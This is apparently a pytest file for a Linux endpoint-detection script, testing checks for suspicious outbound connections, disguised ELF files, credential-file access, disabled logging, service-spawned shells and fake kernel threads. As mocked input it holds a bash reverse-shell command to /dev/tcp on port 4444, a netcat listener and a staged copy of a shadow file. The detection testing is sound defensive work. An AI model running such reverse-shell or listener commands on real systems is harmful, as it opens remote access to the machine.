"""Tests for the static-analysis EDR enhancements added to edr_hunt.py:
network audit, magic-byte mismatch, log tampering, privileged-task integrity,
GTFOBins live-process abuse, and credential-access artifacts."""
import os
import sys
from unittest.mock import patch, MagicMock

from conftest import LINUX_HUNT

sys.path.insert(0, LINUX_HUNT)
import edr_hunt as h  # noqa: E402


def _reset():
    h.FINDINGS.clear()


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def test_hex_to_ip_ipv4():
    assert h._hex_to_ip("0100007F") == "127.0.0.1"
    assert h._hex_to_ip("08080808") == "8.8.8.8"
    assert h._hex_to_ip("0F02000A") == "10.0.2.15"


def test_is_private_ip():
    for ip in ("10.0.2.15", "192.168.1.5", "172.16.0.1", "127.0.0.1", "169.254.1.1"):
        assert h._is_private_ip(ip) is True, ip
    for ip in ("8.8.8.8", "1.1.1.1", "172.32.0.1", "203.0.113.5"):
        assert h._is_private_ip(ip) is False, ip


# /proc/net/tcp data line: sl local rem st tx:rx tr:tm retr uid to inode ...
_ESTAB_LINE = (
    "0: 0100007F:1234 08080808:115C 01 00000000:00000000 "
    "00:00000000 00000000 1000 0 654321 1 ffff 100 0 0 10 0\n"
)
_LISTEN_LINE = (
    "1: 00000000:115C 00000000:0000 0A 00000000:00000000 "
    "00:00000000 00000000 0 0 654321 1 ffff 100 0 0 10 0\n"
)
_HEADER = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"


def test_check_network_outbound_c2_port_high():
    """ESTABLISHED to a public IP on a C2-hint port (4444) -> High."""
    _reset()
    content = _HEADER + _ESTAB_LINE  # rem 8.8.8.8:4444

    def rf(path, *a, **k):
        if path.endswith("/tcp"):
            return content
        return ""  # tcp6 empty; everything else
    with patch.object(h, "_socket_inode_map", return_value={"654321": ("999", "implant")}):
        with patch.object(h, "read_file", side_effect=rf):
            with patch.object(h, "cmdline", return_value="./implant"):
                h.check_network()

    hits = [f for f in h.FINDINGS if f["Type"] == "Suspicious Outbound Connection"]
    assert len(hits) == 1
    assert hits[0]["Severity"] == "High"
    assert "8.8.8.8:4444" in hits[0]["Details"]


def test_check_network_outbound_trusted_proc_skipped():
    """Same connection owned by a trusted process (chrome) is not flagged."""
    _reset()
    content = _HEADER + _ESTAB_LINE

    def rf(path, *a, **k):
        return content if path.endswith("/tcp") else ""
    with patch.object(h, "_socket_inode_map", return_value={"654321": ("999", "chrome")}):
        with patch.object(h, "read_file", side_effect=rf):
            with patch.object(h, "cmdline", return_value="chrome"):
                h.check_network()

    assert not [f for f in h.FINDINGS if f["Type"] == "Suspicious Outbound Connection"]


def test_check_network_listener_external_high():
    """LISTEN on 0.0.0.0:4444 (C2-hint port) -> High."""
    _reset()
    content = _HEADER + _LISTEN_LINE

    def rf(path, *a, **k):
        return content if path.endswith("/tcp") else ""
    with patch.object(h, "_socket_inode_map", return_value={"654321": ("999", "nc")}):
        with patch.object(h, "read_file", side_effect=rf):
            with patch.object(h, "cmdline", return_value="nc -lvp 4444"):
                h.check_network()

    hits = [f for f in h.FINDINGS if f["Type"] == "Unexpected Network Listener"]
    assert len(hits) == 1
    assert hits[0]["Severity"] == "High"


# ---------------------------------------------------------------------------
# Magic-byte / extension mismatch
# ---------------------------------------------------------------------------

def test_magic_mismatch_elf_as_txt(tmp_path):
    """An ELF file carrying a .txt extension in a writable dir -> High."""
    _reset()
    evil = tmp_path / "notes.txt"
    evil.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64)
    benign = tmp_path / "real.txt"
    benign.write_text("just text, nothing to see")

    with patch.object(h, "WRITABLE_DIRS", (str(tmp_path),)):
        with patch("os.path.isdir", side_effect=lambda d: str(d).startswith(str(tmp_path))):
            h.check_magic_mismatch()

    hits = [f for f in h.FINDINGS if f["Type"] == "MagicByte Mismatch"]
    assert len(hits) == 1
    assert hits[0]["Target"].endswith("notes.txt")
    assert hits[0]["Severity"] == "High"


# ---------------------------------------------------------------------------
# Privileged-task binary integrity
# ---------------------------------------------------------------------------

def test_audit_exec_world_writable_is_critical(tmp_path):
    _reset()
    binp = tmp_path / "svc.sh"
    binp.write_text("#!/bin/sh\n")
    os.chmod(str(binp), 0o777)  # world-writable
    h._audit_exec_target(str(binp), "/etc/systemd/system/evil.service", "T1543.002")
    assert any(f["Severity"] == "Critical" and f["Type"] == "Privileged Task World-Writable Binary"
               for f in h.FINDINGS)


def test_audit_exec_missing_in_writable_is_high():
    _reset()
    h._audit_exec_target("/tmp/dropped_payload_xyz", "/etc/systemd/system/x.service", "T1543.002")
    assert any(f["Type"] == "Privileged Task Binary Missing" for f in h.FINDINGS)


def test_audit_exec_missing_in_system_path_ignored():
    """An absent binary in a standard path (uninstalled optional unit) is NOT flagged."""
    _reset()
    h._audit_exec_target("/usr/sbin/quotaon_absent", "/lib/systemd/system/quota.service", "T1543.002")
    assert h.FINDINGS == []


# ---------------------------------------------------------------------------
# GTFOBins live-process abuse
# ---------------------------------------------------------------------------

def test_gtfobins_reverse_shell_flagged():
    _reset()
    with patch.object(h, "proc_pids", return_value=["999"]):
        with patch.object(h, "cmdline", return_value="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"):
            with patch.object(h, "comm", return_value="bash"):
                h.check_gtfobins_exec()
    assert any(f["Type"] == "Suspicious Process Execution" and f["Severity"] == "High"
               for f in h.FINDINGS)


def test_gtfobins_benign_process_not_flagged():
    _reset()
    with patch.object(h, "proc_pids", return_value=["999"]):
        with patch.object(h, "cmdline", return_value="/usr/bin/python3 /opt/app/server.py --port 8000"):
            with patch.object(h, "comm", return_value="python3"):
                h.check_gtfobins_exec()
    assert h.FINDINGS == []


# ---------------------------------------------------------------------------
# Credential-access artifacts
# ---------------------------------------------------------------------------

def test_cred_access_world_readable_shadow():
    _reset()
    with patch("os.stat") as mock_stat:
        mock_stat.return_value = MagicMock(st_mode=0o100644)  # others can read
        with patch("os.path.isdir", return_value=False):
            h.check_cred_access()
    assert any(f["Type"] == "Shadow File World-Readable" for f in h.FINDINGS)


def test_cred_access_staged_artifact(tmp_path):
    _reset()
    (tmp_path / "shadow.bak").write_text("root:$6$...:::\n")
    with patch.object(h, "WRITABLE_DIRS", (str(tmp_path),)):
        with patch("os.stat", side_effect=FileNotFoundError):  # /etc/shadow check skipped
            with patch("os.path.isdir", side_effect=lambda d: str(d).startswith(str(tmp_path))):
                h.check_cred_access()
    assert any(f["Type"] == "Staged Credential Artifact" and f["Target"].endswith("shadow.bak")
               for f in h.FINDINGS)


# ---------------------------------------------------------------------------
# Log / telemetry tampering
# ---------------------------------------------------------------------------

def test_log_tampering_service_disabled():
    _reset()

    def fake_run(cmd):
        if "is-enabled" in cmd:
            return "disabled\n"
        return "inactive\n"
    with patch.object(h, "run", side_effect=fake_run):
        with patch.object(h, "read_file", return_value=None):
            with patch("shutil.which", return_value=None):
                with patch("os.path.isdir", return_value=False):
                    with patch("os.path.isfile", return_value=False):
                        h.check_log_tampering()
    assert any(f["Type"] == "Logging Service Disabled" and f["Target"] == "auditd"
               for f in h.FINDINGS)


# ===========================================================================
# Behavioral / structural correlation checks
# ===========================================================================

def test_network_untrusted_binary_over_443():
    """An ESTABLISHED connection on a *trusted* port (443) from a DELETED binary
    must still be flagged - the behavioral (binary provenance) signal beats the
    port allow-list a beacon would otherwise hide behind."""
    _reset()
    line = ("0: 0100007F:1234 08080808:01BB 01 00000000:00000000 "
            "00:00000000 00000000 1000 0 654321 1 ffff 100 0 0 10 0\n")  # rem 8.8.8.8:443
    content = _HEADER + line

    def rf(path, *a, **k):
        return content if path.endswith("/tcp") else ""
    with patch.object(h, "_socket_inode_map", return_value={"654321": ("999", "beacon")}):
        with patch.object(h, "read_file", side_effect=rf):
            with patch.object(h, "exe_of", return_value="/usr/bin/x (deleted)"):
                with patch.object(h, "cmdline", return_value="./beacon"):
                    h.check_network()
    hits = [f for f in h.FINDINGS if f["Type"] == "External Connection From Untrusted Binary"]
    assert len(hits) == 1 and hits[0]["Severity"] == "High"


def test_process_ancestry_service_spawned_shell():
    """bash descended from nginx, running from /tmp -> Service-Spawned Shell."""
    _reset()
    tbl = {
        "100": {"ppid": "1", "comm": "nginx", "exe": "/usr/sbin/nginx", "deleted": False, "cmd": "nginx"},
        "200": {"ppid": "100", "comm": "bash", "exe": "/tmp/sh", "deleted": False, "cmd": "bash -i"},
    }
    with patch.object(h, "_proc_table", return_value=tbl):
        with patch.object(h, "_pids_with_external_conn", return_value=set()):
            h.check_process_ancestry()
    assert any(f["Type"] == "Service-Spawned Shell" and f["Severity"] == "High" for f in h.FINDINGS)


def test_process_ancestry_benign_helper_not_flagged():
    """A shell under nginx but from a normal path with no corroborating factor is NOT flagged."""
    _reset()
    tbl = {
        "100": {"ppid": "1", "comm": "nginx", "exe": "/usr/sbin/nginx", "deleted": False, "cmd": "nginx"},
        "200": {"ppid": "100", "comm": "sh", "exe": "/usr/bin/dash", "deleted": False, "cmd": "sh /usr/local/bin/rotate.sh"},
    }
    with patch.object(h, "_proc_table", return_value=tbl):
        with patch.object(h, "_pids_with_external_conn", return_value=set()):
            h.check_process_ancestry()
    assert h.FINDINGS == []


def test_masquerade_fake_kernel_thread():
    """A process named like a kernel thread but owning a userland exe -> High."""
    _reset()
    with patch.object(h, "proc_pids", return_value=["999"]):
        with patch.object(h, "comm", return_value="[kworker/0:2]"):
            with patch.object(h, "exe_of", return_value="/tmp/rootkit"):
                with patch.object(h, "cmdline", return_value="[kworker/0:2]"):
                    h.check_masquerade()
    assert any(f["Type"] == "Fake Kernel Thread" and f["Severity"] == "High" for f in h.FINDINGS)


def test_credential_access_open_shadow_handle():
    """A non-auth process with /etc/shadow open -> Credential/Memory Access."""
    _reset()
    with patch("os.getpid", return_value=1):
        with patch.object(h, "proc_pids", return_value=["999"]):
            with patch("os.listdir", return_value=["3"]):
                with patch("os.readlink", return_value="/etc/shadow"):
                    with patch.object(h, "exe_of", return_value="/tmp/dumper"):
                        with patch.object(h, "comm", return_value="dumper"):
                            with patch.object(h, "cmdline", return_value="./dumper"):
                                h.check_credential_access()
    assert any(f["Type"] == "Credential/Memory Access" for f in h.FINDINGS)


def test_credential_access_trusted_auth_daemon_skipped():
    """sshd reading /etc/shadow is normal and must NOT be flagged."""
    _reset()
    with patch("os.getpid", return_value=1):
        with patch.object(h, "proc_pids", return_value=["999"]):
            with patch("os.listdir", return_value=["3"]):
                with patch("os.readlink", return_value="/etc/shadow"):
                    with patch.object(h, "exe_of", return_value="/usr/sbin/sshd"):
                        with patch.object(h, "comm", return_value="sshd"):
                            with patch.object(h, "cmdline", return_value="sshd"):
                                h.check_credential_access()
    assert h.FINDINGS == []
